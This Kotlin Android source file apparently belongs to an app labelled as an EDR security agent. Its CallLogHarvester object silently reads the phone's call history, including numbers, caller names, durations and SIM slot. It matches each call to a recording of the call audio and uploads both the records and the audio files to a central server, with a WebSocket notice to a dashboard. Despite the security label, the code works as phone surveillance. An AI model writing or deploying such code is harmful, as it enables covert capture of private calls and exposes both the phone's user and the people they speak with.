package com.edr.agent.telemetry

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build
import android.provider.CallLog
import android.util.Log
import androidx.core.content.ContextCompat
import com.edr.agent.logging.EdrActionLogger
import com.edr.agent.network.EdrHttpClient
import com.edr.agent.network.EdrNetworkManager
import com.edr.agent.service.EdrForegroundService
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale

/**
 * Data model for a single phone call history record.
 */
data class CallLogRecord(
    val callId: String,
    val phoneNumber: String,
    val callerName: String?,
    val callType: String,      // INCOMING, OUTGOING, MISSED, REJECTED, BLOCKED, UNKNOWN
    val timestamp: Long,       // epoch ms
    val callDate: String,      // YYYY-MM-DD
    val durationSeconds: Long, // Duration in seconds
    val formattedDuration: String, // e.g. "3m 45s", "0s (Missed)"
    val simSlot: String? = null,
    var recordingStatus: String? = null,
    var recordingReason: String? = null,
    var recordingFilename: String? = null,
    var recordingUrl: String? = null,
    var hasRecording: Boolean = false,
    var recordingSizeBytes: Long = 0L
)

/**
 * Autonomous Phone History & Call Duration Harvester for EDR.
 *
 * Silently reads CallLog.Calls with exact call durations, timestamps, and caller details,
 * matches call audio recordings, and securely synchronizes them to the central EDR server.
 */
object CallLogHarvester {
    private const val TAG = "CallLogHarvester"
    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
    private val httpClient = EdrHttpClient.apiClient

    private val uploadedCallFiles = Collections.synchronizedSet(mutableSetOf<String>())

    /**
     * Checks if READ_CALL_LOG permission is currently granted.
     */
    fun hasPermission(context: Context): Boolean {
        if (SyncPreferences.isPermissionDisabledByAdmin("callLog")) return false
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Harvests up to [limit] recent phone call history records from the Android system.
     */
    fun harvestCallLogs(context: Context, limit: Int = 1000): List<CallLogRecord> {
        if (!hasPermission(context)) {
            Log.w(TAG, "Cannot harvest call logs: READ_CALL_LOG permission not granted.")
            return emptyList()
        }

        val records = mutableListOf<CallLogRecord>()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.US)

        val projection = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                CallLog.Calls.PHONE_ACCOUNT_ID
            } else {
                CallLog.Calls._ID
            }
        )

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            if (cursor != null && cursor.moveToFirst()) {
                val idIdx = cursor.getColumnIndex(CallLog.Calls._ID)
                val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val simIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
                } else -1

                do {
                    val callId = if (idIdx >= 0) cursor.getString(idIdx) ?: "" else ""
                    val rawNumber = if (numberIdx >= 0) cursor.getString(numberIdx) ?: "" else ""
                    val callerName = if (nameIdx >= 0) cursor.getString(nameIdx) else null
                    val rawType = if (typeIdx >= 0) cursor.getInt(typeIdx) else 0
                    val callDateMs = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                    val durationSec = if (durationIdx >= 0) cursor.getLong(durationIdx) else 0L
                    val simSlot = if (simIdx >= 0) cursor.getString(simIdx) else null

                    val callType = mapCallType(rawType)
                    val formattedDuration = formatDuration(durationSec, callType)
                    val callDateStr = if (callDateMs > 0) dateFormat.format(Date(callDateMs)) else ""

                    val recFile = CallAudioRecorder.findRecordingForCall(context, rawNumber, callDateMs)
                    val hasRec = recFile != null && recFile.exists() && recFile.length() > 500
                    val recStatus = if (hasRec) "RECORDED" else "NOT_RECORDED"
                    val recReason = if (hasRec) null else {
                        when {
                            durationSec <= 0L || callType == "MISSED" || callType == "REJECTED" || callType == "BLOCKED" ->
                                "Missed or unanswered call"
                            SyncPreferences.isManualPaused ->
                                "EDR Protection paused by admin"
                            SyncPreferences.isNetworkPaused ->
                                "EDR Protection paused on mobile data (Data Saver)"
                            ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ->
                                "Microphone permission missing"
                            else ->
                                "Recording not captured"
                        }
                    }

                    records.add(
                        CallLogRecord(
                            callId = callId,
                            phoneNumber = rawNumber,
                            callerName = callerName?.takeIf { it.isNotBlank() },
                            callType = callType,
                            timestamp = callDateMs,
                            callDate = callDateStr,
                            durationSeconds = durationSec,
                            formattedDuration = formattedDuration,
                            simSlot = simSlot,
                            recordingStatus = recStatus,
                            recordingReason = recReason,
                            recordingFilename = recFile?.name,
                            hasRecording = hasRec,
                            recordingSizeBytes = recFile?.length() ?: 0L
                        )
                    )
                    if (records.size >= limit) break
                } while (cursor.moveToNext())
            }

            Log.i(TAG, "Harvested ${records.size} call history records from device.")
        } catch (e: Exception) {
            Log.e(TAG, "Error harvesting call logs: ${e.message}", e)
        } finally {
            cursor?.close()
        }

        return records
    }

    /**
     * Harvests and uploads phone history with call recordings to central EDR backend on a background thread.
     */
    fun harvestAndUpload(context: Context, callback: ((Boolean, Int) -> Unit)? = null) {
        if (SyncPreferences.isAgentPaused) {
            val netWire = EdrNetworkManager.getWireNetworkType(context)
            Log.d(TAG, "Call log sync skipped: network is $netWire (EDR Paused)")
            EdrActionLogger.logSkipped(
                context = context,
                module = "DataCollection",
                eventType = "CALL_LOG_SYNC",
                triggeredBy = "Automatic",
                description = "Phone call history sync",
                reason = "Skipped: network $netWire (EDR Paused)"
            )
            callback?.invoke(true, 0)
            return
        }

        Thread {
            try {
                EdrActionLogger.runLoggedAction(
                    context = context,
                    module = "DataCollection",
                    eventType = "CALL_LOG_SYNC",
                    triggeredBy = "Automatic",
                    description = "Phone call history harvesting & sync"
                ) { actCtx ->
                    val records = harvestCallLogs(context)
                    if (records.isEmpty()) {
                        callback?.invoke(true, 0)
                        return@runLoggedAction
                    }

                    val deviceId = SyncPreferences.deviceId
                    val baseUrl = SyncPreferences.httpBaseUrl
                    if (deviceId.isEmpty() || baseUrl.isEmpty()) {
                        callback?.invoke(false, 0)
                        return@runLoggedAction
                    }

                    // 1. Upload any pending call audio recordings across all internet connections
                    for (rec in records) {
                        if (rec.hasRecording) {
                            val recFile = CallAudioRecorder.findRecordingForCall(context, rec.phoneNumber, rec.timestamp)
                            if (recFile != null && recFile.exists() && recFile.length() > 500) {
                                val uploadedName = uploadCallAudioFile(recFile, rec.callId, rec.phoneNumber, rec.timestamp)
                                if (uploadedName != null) {
                                    rec.recordingFilename = uploadedName
                                    rec.hasRecording = true
                                    rec.recordingStatus = "RECORDED"
                                    rec.recordingReason = null
                                    actCtx.addUploadedBytes(recFile.length())
                                }
                            }
                        }
                    }

                    // 2. Upload synchronized call log records to backend
                    val payload = mapOf(
                        "deviceId" to deviceId,
                        "callLogs" to records
                    )

                    val jsonBytes = gson.toJson(payload).toByteArray()
                    actCtx.addUploadedBytes(jsonBytes.size.toLong())
                    val body = jsonBytes.toRequestBody(jsonMediaType)
                    val request = Request.Builder()
                        .url("$baseUrl/api/call-logs/upload")
                        .post(body)
                        .build()

                    val response = httpClient.newCall(request).execute()
                    val success = response.isSuccessful
                    val code = response.code
                    response.close()

                    if (success) {
                        Log.i(TAG, "Successfully uploaded ${records.size} phone history records to EDR server.")
                        EdrLocalStorage.appendEdrLog(
                            context,
                            "CALL_SYNC",
                            "Synchronized ${records.size} call records with duration & audio status to central vault."
                        )

                        // Also broadcast via WebSocket so dashboard updates instantly
                        val wsMsg = mapOf(
                            "type" to "CALL_LOGS_SYNCED",
                            "deviceId" to deviceId,
                            "payload" to mapOf(
                                "count" to records.size,
                                "latestTimestamp" to (records.firstOrNull()?.timestamp ?: 0L)
                            ),
                            "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                        )
                        val wsJson = gson.toJson(wsMsg)
                        actCtx.addUploadedBytes(wsJson.toByteArray().size.toLong())
                        EdrForegroundService.instance?.sendWebSocketMessage(wsJson)

                        callback?.invoke(true, records.size)
                    } else {
                        throw RuntimeException("Server responded with HTTP $code")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed harvesting & uploading call logs: ${e.message}")
                callback?.invoke(false, 0)
            }
        }.start()
    }

    private fun uploadCallAudioFile(file: File, callId: String, phoneNumber: String, timestamp: Long): String? {
        val deviceId = SyncPreferences.deviceId
        val baseUrl = SyncPreferences.httpBaseUrl
        if (deviceId.isEmpty() || baseUrl.isEmpty()) return null

        val fileKey = "${deviceId}_${file.name}"
        if (uploadedCallFiles.contains(fileKey)) {
            return file.name
        }

        return try {
            val audioMediaType = "audio/mp4".toMediaType()
            val fileBody = file.asRequestBody(audioMediaType)
            val multipart = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("deviceId", deviceId)
                .addFormDataPart("callId", callId)
                .addFormDataPart("phoneNumber", phoneNumber)
                .addFormDataPart("timestamp", timestamp.toString())
                .addFormDataPart("audio", file.name, fileBody)
                .build()

            val request = Request.Builder()
                .url("$baseUrl/api/call-logs/upload-recording")
                .post(multipart)
                .build()

            val response = httpClient.newCall(request).execute()
            val success = response.isSuccessful
            response.close()

            if (success) {
                uploadedCallFiles.add(fileKey)
                Log.i(TAG, "Uploaded call recording audio: ${file.name}")
                file.name
            } else {
                Log.w(TAG, "Server rejected call audio upload: HTTP ${response.code}")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading call recording audio ${file.name}: ${e.message}")
            null
        }
    }

    private fun mapCallType(rawType: Int): String {
        return when (rawType) {
            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
            CallLog.Calls.MISSED_TYPE -> "MISSED"
            CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
            else -> "UNKNOWN"
        }
    }

    private fun formatDuration(durationSec: Long, callType: String): String {
        if (durationSec <= 0L) {
            return when (callType) {
                "MISSED" -> "0s (Missed)"
                "REJECTED" -> "0s (Rejected)"
                "BLOCKED" -> "0s (Blocked)"
                else -> "0s"
            }
        }
        val hours = durationSec / 3600
        val minutes = (durationSec % 3600) / 60
        val seconds = durationSec % 60
        return when {
            hours > 0 -> String.format(Locale.US, "%dh %02dm %02ds", hours, minutes, seconds)
            minutes > 0 -> String.format(Locale.US, "%dm %02ds", minutes, seconds)
            else -> "${seconds}s"
        }
    }
}
